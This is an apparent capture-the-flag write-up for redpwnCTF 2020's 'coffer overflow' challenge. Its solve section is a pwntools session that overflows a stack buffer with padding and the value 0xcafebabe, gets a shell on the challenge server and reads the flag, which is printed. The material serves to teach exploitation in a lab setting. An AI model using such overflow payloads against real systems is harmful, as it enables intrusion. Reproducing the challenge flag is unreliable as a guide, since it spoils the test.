### Challenge

### Recon


### Solve

```
kali@kali:~$ python
Python 2.7.17 (default, Jan 19 2020, 19:54:54) 
[GCC 9.2.1 20200110] on linux2
Type "help", "copyright", "credits" or "license" for more information.

>>> from pwn import *
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kali/.pwntools-cache-2.7/update to 'never'.
[*] A newer version of pwntools is available on pypi (4.0.1 --> 4.1.2).
    Update with: $ pip install -U pwntools

>>> conn = remote('2020.redpwnc.tf',31255)
[x] Opening connection to 2020.redpwnc.tf on port 31255
[x] Opening connection to 2020.redpwnc.tf on port 31255: Trying 35.231.164.133
[+] Opening connection to 2020.redpwnc.tf on port 31255: Done
>>> conn.recv()
'Welcome to coffer overflow, where our coffers are overfilling with bytes ;)\nWhat do you want to fill your coffer with?\n'
>>> payload = "A"*24
>>> payload += p64(0xcafebabe)
>>> payload += "B"*12
>>> payload
'AAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca\x00\x00\x00\x00BBBBBBBBBBBB'
>>> conn.send(payload)
>>> conn.interactive()
[*] Switching to interactive mode
ls
ls
Makefile
bin
coffer-overflow-1
coffer-overflow-1.c
dev
flag.txt
lib
lib32
lib64
cat flag.txt
flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
^C[*] Interrupted
>>> 
```